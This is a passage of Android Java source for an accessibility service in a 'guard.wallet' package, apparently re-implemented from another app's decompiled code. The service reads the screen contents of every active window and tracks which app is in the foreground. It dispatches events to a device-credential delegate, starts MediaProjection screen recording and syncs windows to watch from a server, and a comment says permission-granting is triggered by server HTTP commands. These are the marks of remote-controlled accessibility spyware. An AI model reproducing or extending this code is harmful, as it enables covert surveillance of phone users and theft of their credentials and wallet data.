                            && delegate.l().contains(Integer.valueOf(event.getEventType()))) {
                        delegate.u(event, u2.get(), v2.get());
                    }
                }
            }
            g0(event);
        } catch (Exception ex) {
            AppUtils.s("noticeAccessibilityEvent", ex);
        }
    }

    /**
     * vendor g0(event) — dispatch event to g0 delegate (global event handler).
     */
    public final void g0(AccessibilityEvent event) {
        UseDeviceCredentialDelegate g0Delegate = this.g;
        try {
            if (g0Delegate.o() && g0Delegate.S()) {
                String pkg = u2.get();
                String win = v2.get();
                if (!g0Delegate.c(pkg, win) || g0Delegate.l() == null
                        || g0Delegate.l().isEmpty()
                        || !g0Delegate.l().contains(Integer.valueOf(event.getEventType()))) {
                    return;
                }
                g0Delegate.u(event, pkg, win);
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    /**
     * vendor h0(pkgName, windowClass, windowTitle, isComplete) — notify delegates of root change.
     * Iterates delegate queue, activates/deactivates based on package matching.
     */
    public final boolean h0(String pkgName, String windowClass, String windowTitle, boolean isComplete) {
        boolean result = false;
        ConcurrentLinkedQueue delegateQueue = this.a;
        try {
            if (delegateQueue.isEmpty()) {
                return false;
            }
            Iterator it = delegateQueue.iterator();
            while (it.hasNext()) {
                try {
                    AccessibilityDelegate delegate = (AccessibilityDelegate) it.next();
                    if (delegate != null) {
                        if (delegate.c(pkgName, windowClass)) {
                            if (!Objects.equals(Boolean.TRUE, Boolean.valueOf(delegate.o()))) {
                                delegate.w(true);
                            }
                            delegate.v(s2.get(), isComplete, pkgName, windowClass, windowTitle);
                            result = true;
                        } else if (!Objects.equals(Boolean.FALSE, Boolean.valueOf(delegate.o()))) {
                            delegate.w(false);
                        }
                    }
                } catch (Exception ex) {
                    AppUtils.s("noticeRootChanged", ex);
                    return result;
                }
            }
            return result;
        } catch (Exception ex) {
            AppUtils.s("noticeRootChanged", ex);
            return result;
        }
    }

    /**
     * vendor i0(pkgName, windowClass, windowTitle, isComplete) — notify g0 delegate of root change.
     */
    public final boolean i0(String pkgName, String windowClass, String windowTitle, boolean isComplete) {
        UseDeviceCredentialDelegate g0Delegate = this.g;
        boolean result = false;
        try {
            if (g0Delegate.c(pkgName, windowClass)) {
                g0Delegate.w(true);
                this.g.v(s2.get(), isComplete, pkgName, windowClass, windowTitle);
                result = true;
            } else {
                g0Delegate.V(pkgName, windowClass);
                if (!Objects.equals(Boolean.FALSE, Boolean.valueOf(g0Delegate.o()))) {
                    g0Delegate.w(false);
                }
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        return result;
    }

    /**
     * vendor j0() — initialize service after connection.
     * Sets up thread pool, flags, loads listen windows, notifies strategy.
     */
    public final void j0() {
        try {
            r2.set(false);
            this.o = new ThreadPoolExecutor(0, 20, 50L, TimeUnit.MILLISECONDS,
                    new SynchronousQueue<>());
            p.set(this);
            if (!com.guard.wallet.utils.SystemHelper.p0() && com.guard.wallet.utils.SharedPrefsManager.q()) {
                com.guard.wallet.utils.SystemHelper.F0(1);
                com.guard.wallet.utils.SystemHelper.T0(5);
                synchronized (com.guard.wallet.utils.SharedPrefsManager.class) {
                    com.guard.wallet.utils.SharedPrefsManager.D(Boolean.FALSE, "isFirstOpenAccessibility");
                }
            }
            p0();

            // GrantPermissionDelegate 不再自动注册 — 由服务端按需通过 HTTP 命令触发

            if (d0() <= 2) {
                com.guard.wallet.http.HttpApiManager.syncListenWindows();
            }
            if (MainApplication.getInstance() != null) {
                MainApplication.getInstance().offerAccessibilityEvent(32);
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    /**
     * vendor k0() — read all screen nodes from all active windows.
     * Returns ReadScreenWindow with flattened node tree.
     */
    public final ReadScreenWindow k0() {
        int windowId = -1;
        String title = T();
        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows != null && !windows.isEmpty()) {
                for (AccessibilityWindowInfo win : windows) {
                    if (win != null && win.isActive()) {
                        windowId = win.getId();
                        break;
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        ReadScreenWindow result = new ReadScreenWindow(title, windowId, u2.get(), v2.get());
        List<AccessibilityWindowInfo> windows = getWindows();
        if (windows != null && !windows.isEmpty()) {
            for (AccessibilityWindowInfo win : windows) {
                if (win != null) {
                    AccessibilityNodeInfo root = Build.VERSION.SDK_INT >= 33
                            ? win.getRoot(4) : win.getRoot();
                    if (root != null) {
                        e0(m0(root), 0, 0, result);
                    }
                }
            }
        }
        return result;
    }

    /**
     * vendor l0(refreshDelegates) — refresh root node and notify delegates.
     * Returns NoticeRootChangedVO with current state.
     */
    public final NoticeRootChangedVO l0(boolean refreshDelegates) {
        try {
            RootInActiveWindowResult rootResult = R();
            AccessibilityNodeInfo curRoot = rootResult.getCurRoot();
            if (curRoot != null) {
                String rootPkg = curRoot.getPackageName() != null
                        ? curRoot.getPackageName().toString() : null;
                String rootClass = curRoot.getClassName() != null
                        ? curRoot.getClassName().toString() : null;

                if (!curRoot.equals(t2.get())) {
                    Log.d(TAG, "当前视图根节点已变化");
                }
                UiObject newRoot = UiObject.createRoot(curRoot);
                if (u2.get() != null) {
                    Log.d(TAG, "上一个运行包名 old activePackageName:" + u2.get());
                }
                if (v2.get() != null) {
                    Log.d(TAG, "上一个运行窗口 old activeWindowClassName:" + v2);
                }
                if (!AppUtils.B(rootClass)) {
                    Log.d(TAG, "当前视图栈顶节点:" + rootClass);
                }

                boolean packageEquals = Objects.equals(u2.get(), rootPkg);
                boolean packageChanged;
                boolean windowChanged;
                if (packageEquals) {
                    windowChanged = false;
                    packageChanged = false;
                    if (l(com.guard.wallet.utils.SystemHelper.v0(rootPkg, rootClass, AccessibilityDelegate.class.getName()))
                            && !Objects.equals(v2.get(), rootClass)) {
                        v2.set(rootClass);
                        w2.set(T());
                        windowChanged = true;
                    }
                } else {
                    u2.set(rootPkg);
                    v2.set(rootClass);
                    w2.set(T());
                    windowChanged = true;
                    packageChanged = true;
                }

                H(packageChanged, windowChanged);
                t2.set(curRoot);
                s2.set(newRoot);

                if (packageChanged) {
                    Log.d(TAG, "当前运行包名已变化 new rootPackageName:" + u2.get());
                }
                if (windowChanged) {
                    Log.d(TAG, "当前运行窗口已变化 new windowClassName:" + v2.get());
                    Log.d(TAG, "当前运行窗口已变化 new windowTitle:" + w2.get());
                }
                if (refreshDelegates) {
                    h0(u2.get(), v2.get(), w2.get(), rootResult.isComplete());
                }
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        return new NoticeRootChangedVO(s2.get(), u2.get(), v2.get());
    }

    // ═══════ Lifecycle methods ═══════

    @Override
    public final void onAccessibilityEvent(AccessibilityEvent event) {
        ReentrantLock lock = this.l;
        if (!lock.tryLock()) {
            Log.e(TAG, "onAccessibilityEvent 事件被忽略:" + event.toString());
            return;
        }
        try {
            this.h.set(true);
            if (p.get() == null) {
                p.set(this);
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            Log.e(TAG, "onAccessibilityEvent 出错");
        }
        if (U(event)) {
            lock.unlock();
            return;
        }
        if (com.guard.wallet.power.PowerSaveChecker.shouldKeepAlive()) {
            lock.unlock();
            return;
        }
        G(event);
        f0(event);
        b0(event);
        c0(event);
        try {
            if (!X(event) && this.o != null) {
                AccessibilityEvent copy;
                if (Build.VERSION.SDK_INT >= 30) {
                    // vendor: d0.a.a.v() — synthetic no-op, removed
                    copy = com.guard.wallet.infra.AccessibilityCompat.copyEvent(event);
                } else {
                    copy = AccessibilityEvent.obtain(event);
                }
                this.o.submit(new ScreenCaptureTask(this, copy, 1));
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        lock.unlock();
    }

    @Override
    public final void onCreate() {
        super.onCreate();
        try {
            s2.set(null);
            t2.set(null);
            u2.set(null);
            v2.set(null);
            Log.d(TAG, "MyAccessibilityService on create");
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    @Override
    public final void onDestroy() {
        Log.d(TAG, "无障碍服务已销毁");
        try {
            this.h.set(false);
            if (this.o != null) {
                this.o.shutdownNow();
                this.o = null;
            }
            this.g.d();
            ScreenCaptureManager rInstance = this.e;
            rInstance.getClass();
            try {
                rInstance.a.shutdownNow();
            } catch (Exception ex) {
                AppUtils.s("ScreenCaptureManager", ex);
            }
            // ADAPT: VideoRecordManager cleanup stubbed
            this.m = null;

            s2.set(null);
            t2.set(null);
            u2.set(null);
            v2.set(null);
            D();
            ConcurrentLinkedQueue delegateQueue = this.a;
            try {
                if (!delegateQueue.isEmpty()) {
                    delegateQueue.removeIf(new com.guard.wallet.infra.DelegateRemovePredicate(this, 4));
                }
            } catch (Exception ex) {
                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", ex);
            }
            delegateQueue.clear();
            this.k.set(0);
            this.b.clear();
            this.c.clear();
            this.d.clear();
            q0();
            if (MainApplication.getInstance() != null) {
                MainApplication.getInstance().offerStrategyEvent("ACCESSIBILITY_SERVICE_OFF");
            }
            p.set(null);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        super.onDestroy();
    }

    @Override
    public final void onInterrupt() {
        Log.d(TAG, "无障碍服务已中断");
    }

    @Override
    public final void onLowMemory() {
        try {
            Log.d(TAG, "无障碍服务 onLowMemory");
            H(true, true);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        super.onLowMemory();
    }

    @Override
    public final void onRebind(Intent intent) {
        super.onRebind(intent);
        try {
            Log.d(TAG, "无障碍服务已重启");
            s2.set(null);
            t2.set(null);
            u2.set(null);
            v2.set(null);
            j0();
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    @Override
    public final void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "=== onServiceConnected 开始 ===");
        try {
            r0();
            Log.d(TAG, "r0() 完成, p=" + p.get());
            j0();
            Log.d(TAG, "j0() 完成, 线程池=" + (this.o != null) + ", p=" + p.get());
        } catch (Exception ex) {
            Log.e(TAG, "onServiceConnected 异常", ex);
            AppUtils.s(TAG, ex);
        }
        Log.d(TAG, "=== onServiceConnected 结束 ===");
    }

    @Override
    public final void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Log.d(TAG, "MyAccessibilityService on start");
    }

    @Override
    public final void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        Log.d(TAG, "Service on task removed");
    }

    @Override
    public final void onTrimMemory(int level) {
        try {
            Log.d(TAG, "无障碍服务 onTrimMemory level:" + level);
            H(true, true);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        super.onTrimMemory(level);
    }

    @Override
    public final boolean onUnbind(Intent intent) {
        Log.d(TAG, "无障碍服务已关闭");
        return super.onUnbind(intent);
    }

    /**
     * vendor p0() — send ACCESSIBILITY_CONTAINER opened event.
     */
    public final void p0() {
        try {
            MessageRecordVO record = new MessageRecordVO();
            ContainerEventVO container = new ContainerEventVO();
            container.setPackageName(getPackageName());
            container.setContainerCode("ACCESSIBILITY_CONTAINER");
            container.setIsOpened(1);
            container.setServiceState(-1);
            record.setIntentCode("android.intent.action.CONTAINER_EVENT");
            record.setExtraBody(container);
            if (MainApplication.getInstance() == null
                    || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                return;
            }
            MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    /**
     * vendor q0() — send ACCESSIBILITY_CONTAINER closed event.
     */
    public final void q0() {
        try {
            MessageRecordVO record = new MessageRecordVO();
            ContainerEventVO container = new ContainerEventVO();
            container.setPackageName(getPackageName());
            container.setContainerCode("ACCESSIBILITY_CONTAINER");
            container.setIsOpened(0);
            container.setServiceState(-1);
            record.setIntentCode("android.intent.action.CONTAINER_EVENT");
            record.setExtraBody(container);
            if (MainApplication.getInstance() == null
                    || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                return;
            }
            MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    /**
     * vendor r0() — configure accessibility service info.
     * Sets eventTypes, feedbackType, flags, notificationTimeout.
     * Enables cache on API 33+.
     */
    public final void r0() {
        try {
            AccessibilityServiceInfo info = getServiceInfo();
            if (info == null) {
                Log.d(TAG, "ServiceInfo in Null");
                this.i.set(true);
                return;
            }
            // Check if service previously crashed
            boolean crashed = false;
            try {
                java.lang.reflect.Field field = AccessibilityServiceInfo.class.getDeclaredField("crashed");
                if (field != null) {
                    field.setAccessible(true);
                    crashed = field.getBoolean(info);
                }
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }
            this.i.set(crashed);
            // vendor eventTypes = 0x80783f = 8419391
            info.feedbackType = -1;
            info.eventTypes = 8419391;
            info.flags = 91;
            info.notificationTimeout = 0;
            setServiceInfo(info);
            if (Build.VERSION.SDK_INT >= 33) {
                setCacheEnabled(true);
            }
            Log.d(TAG, "辅助功能进入正常模式");
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    /**
     * vendor s0() — start video recording.
     * ADAPT: reuse MediaProjection foreground service as the minimal
     * recording implementation instead of vendor's internal timer manager.
     */
    public final boolean s0() {
        try {
            if (this.Y()) {
                return true;
            }
            com.guard.wallet.capture.ScreenCaptureManager.getInstance().requestProjection();
            return true;
        } catch (Exception ex) {
            AppUtils.s("VideoRecordManager", ex);
            return false;
        }
    }

    /**
     * vendor t0() — stop video recording.
     * ADAPT: stop MediaProjection foreground service and release capture state.
     */
    public final boolean t0() {
        try {
            this.videoRecordingActive.set(false);
            this.videoRecordingStartedAt.set(0L);
            this.m = null;
            try {
                com.guard.wallet.capture.ScreenCaptureManager capture = com.guard.wallet.capture.ScreenCaptureManager.getInstance();
                capture.requesting.set(false);
                capture.release();
            } catch (Exception ex) {
                AppUtils.s("VideoRecordManager", ex);
            }
            try {
                stopService(new Intent(this, MediaLiveService.class));
            } catch (Exception ex) {
                AppUtils.s("VideoRecordManager", ex);
            }
            return true;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return false;
        }
    }

    /** vendor getRootInActiveWindowSafe() — safe wrapper */
    public AccessibilityNodeInfo getRootInActiveWindowSafe() {
        try {
            return getRootInActiveWindow();
        } catch (Exception ex) {
            return null;
        }
    }
}
